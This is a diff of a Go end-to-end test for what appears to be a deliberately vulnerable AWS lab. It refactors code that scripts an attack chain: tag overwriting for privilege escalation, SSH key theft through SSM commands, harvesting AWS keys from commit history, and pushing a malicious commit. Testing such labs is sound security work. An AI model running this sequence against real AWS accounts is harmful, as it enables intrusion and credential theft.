@@ -2,6 +2,7 @@ package test
 
 import (
 	"context"
+	"fmt"
 	"log"
 	"regexp"
 	"strings"
@@ -41,8 +42,9 @@ type EndToEndTest struct {
 
 const AWS_REGION string = "eu-west-1"
 
-func TestScenario(t *testing.T) {
+var ctx = context.Background()
 
+func TestScenario(t *testing.T) {
 	test := EndToEndTest{
 		t:            t,
 		region:       AWS_REGION,
@@ -76,7 +78,10 @@ func TestScenario(t *testing.T) {
 
 	// Step 5: Find credentials in commit history
 	test.t.Log("Searching for leaked AWS credentials in commit history")
-	stepTwoCredentials := test.FindAWSCredentialsInCommitHistory(gitRepo)
+	stepTwoCredentials, err := test.FindAWSCredentialsInCommitHistory(gitRepo)
+	if err != nil {
+		test.assert.Nil(err, "searching repo for creds: %s", err)
+	}
 
 	// From now on, use the credentials from step 2
 	test.awsConfig = AwsConfigFromCredentials(stepTwoCredentials.AccessKeyID, stepTwoCredentials.SecretAccessKey)
@@ -93,7 +98,7 @@ func AwsConfigFromCredentials(accessKeyId string, secretAccessKey string) aws.Co
 	credentialsProvider := config.WithCredentialsProvider(
 		credentials.NewStaticCredentialsProvider(accessKeyId, secretAccessKey, ""),
 	)
-	cfg, err := config.LoadDefaultConfig(context.TODO(), credentialsProvider, config.WithRegion(AWS_REGION))
+	cfg, err := config.LoadDefaultConfig(ctx, credentialsProvider, config.WithRegion(AWS_REGION))
 	if err != nil {
 		log.Fatalf("unable to load SDK config, %v", err)
 	}
@@ -138,7 +143,7 @@ func (test *EndToEndTest) TestApi() {
 func (test *EndToEndTest) FindVulnerableInstance() string {
 	// Find the vulnerable EC2 instance of which to overwrite tags later
 	ec2Client := ec2.NewFromConfig(test.awsConfig)
-	instances, err := ec2Client.DescribeInstances(context.TODO(), &ec2.DescribeInstancesInput{
+	instances, err := ec2Client.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
 		Filters: []types.Filter{{Name: aws.String("instance-state-name"), Values: []string{"running"}}},
 	})
 	test.assert.Nil(err, "unable to list running instances")
@@ -150,7 +155,7 @@ func (test *EndToEndTest) FindVulnerableInstance() string {
 func (test *EndToEndTest) OverwriteInstanceTagsForPrivilegeEscalation(instanceId string) {
 	// Overwrite the 'Environment' tags for privilege escalation
 	ec2Client := ec2.NewFromConfig(test.awsConfig)
-	_, err := ec2Client.CreateTags(context.TODO(), &ec2.CreateTagsInput{
+	_, err := ec2Client.CreateTags(ctx, &ec2.CreateTagsInput{
 		Resources: []string{instanceId},
 		Tags: []types.Tag{
 			{Key: aws.String("Environment"), Value: aws.String("sandbox")},
@@ -162,7 +167,7 @@ func (test *EndToEndTest) OverwriteInstanceTagsForPrivilegeEscalation(instanceId
 func (test *EndToEndTest) StealPrivateSSHKey(instanceId string) string {
 	// Execute a SSM command on the instance to steal the SSH private key
 	ssmClient := ssm.NewFromConfig(test.awsConfig)
-	result, err := ssmClient.SendCommand(context.TODO(), &ssm.SendCommandInput{
+	result, err := ssmClient.SendCommand(ctx, &ssm.SendCommandInput{
 		DocumentName: aws.String("AWS-RunShellScript"),
 		InstanceIds:  []string{instanceId},
 		Parameters: map[string][]string{
@@ -171,7 +176,7 @@ func (test *EndToEndTest) StealPrivateSSHKey(instanceId string) string {
 	})
 	test.assert.Nil(err, "Unable to send SSM command to instance")
 
-	commandOutput, err := ssm.NewCommandExecutedWaiter(ssmClient).WaitForOutput(context.TODO(), &ssm.GetCommandInvocationInput{
+	commandOutput, err := ssm.NewCommandExecutedWaiter(ssmClient).WaitForOutput(ctx, &ssm.GetCommandInvocationInput{
 		CommandId:  result.Command.CommandId,
 		InstanceId: &instanceId,
 	}, 2*time.Minute)
@@ -183,7 +188,7 @@ func (test *EndToEndTest) StealPrivateSSHKey(instanceId string) string {
 func (test *EndToEndTest) FindSSHKeyId(username string) string {
 	// Find the SSH key ID (to be used as an username) of a specific user
 	iamClient := iam.NewFromConfig(test.awsConfig)
-	sshKeys, err := iamClient.ListSSHPublicKeys(context.TODO(), &iam.ListSSHPublicKeysInput{
+	sshKeys, err := iamClient.ListSSHPublicKeys(ctx, &iam.ListSSHPublicKeysInput{
 		UserName: aws.String(username),
 	})
 	test.assert.Nil(err, "failed to list SSH Keys")
@@ -205,46 +210,64 @@ func (test *EndToEndTest) CloneCodeCommitRepository(sshKeyId string, privateSSHK
 	return repo
 }
 
-func (test *EndToEndTest) FindAWSCredentialsInCommitHistory(repo *git.Repository) aws.Credentials {
+func (test *EndToEndTest) FindAWSCredentialsInCommitHistory(repo *git.Repository) (*aws.Credentials, error) {
 	// Find AWS credentials in the commit history of the repository (more precisely, in the first commit)
 
 	// Step 1: Find the first commit
-	head, _ := repo.Head()
-	branchCommit, _ := repo.CommitObject(head.Hash())
+	head, err := repo.Head()
+	if err != nil {
+		return nil, fmt.Errorf("fetching repo head: %w", err)
+	}
+
+	branchCommit, err := repo.CommitObject(head.Hash())
+	if err != nil {
+		return nil, fmt.Errorf("retrieving commit %s: %w", head.Hash(), err)
+	}
+
 	commits := object.NewCommitPreorderIter(branchCommit, make(map[plumbing.Hash]bool, 0), make([]plumbing.Hash, 0))
 	var firstCommit *object.Commit
-	commits.ForEach(func(c *object.Commit) error {
+	err = commits.ForEach(func(c *object.Commit) error {
 		firstCommit = c
 		return nil
 	})
+	if err != nil {
+		return nil, fmt.Errorf("retrieving first commit: %w", err)
+	}
 
 	// Step 2
 	// We know credentials were in the first commit
 	// Retrieve contents of buildspec.yml at this point in time
-	files, _ := firstCommit.Files()
+	files, err := firstCommit.Files()
+	if err != nil {
+		return nil, fmt.Errorf("getting files of first commit: %w", err)
+	}
+
 	var buildSpecContents string
-	files.ForEach(func(f *object.File) error {
+	err = files.ForEach(func(f *object.File) error {
 		if f.Name == "buildspec.yml" {
 			buildSpecContents, _ = f.Contents()
 		}
 		return nil
 	})
+	if err != nil {
+		return nil, fmt.Errorf("retrieving buildspec.yml: %w", err)
+	}
 
 	// Extract credentials from the buildspec.yml contents
 	accessKeyId := regexp.MustCompile("AWS_ACCESS_KEY_ID=(.{20})").FindStringSubmatch(buildSpecContents)[1]
 	secretAccessKey := regexp.MustCompile("AWS_SECRET_ACCESS_KEY=(.{40})").FindStringSubmatch(buildSpecContents)[1]
 
-	return aws.Credentials{
+	return &aws.Credentials{
 		AccessKeyID:     accessKeyId,
 		SecretAccessKey: secretAccessKey,
-	}
+	}, nil
 }
 
 func (test *EndToEndTest) PushMaliciousCommit(repo *git.Repository) {
 	// Push a file to the CodeCommit repository
 	codecommitClient := codecommit.NewFromConfig(test.awsConfig)
 	head, _ := repo.Head()
-	_, err := codecommitClient.PutFile(context.TODO(), &codecommit.PutFileInput{
+	_, err := codecommitClient.PutFile(ctx, &codecommit.PutFileInput{
 		BranchName:     aws.String("master"),
 		FileContent:    []byte("test"),
 		FilePath:       aws.String("app.py"),
